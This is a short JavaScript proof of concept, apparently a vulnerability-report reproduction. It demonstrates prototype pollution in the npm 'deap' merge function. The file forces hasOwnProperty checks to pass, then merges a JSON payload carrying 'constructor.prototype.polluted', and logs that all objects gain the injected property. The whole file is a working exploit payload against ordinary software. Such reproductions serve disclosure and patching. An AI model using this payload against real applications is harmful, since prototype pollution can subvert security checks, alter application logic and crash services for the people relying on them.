Object.prototype.hasOwnProperty.call = () => true;
const deap = require('deap');
obj = {};
let malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
deap.merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);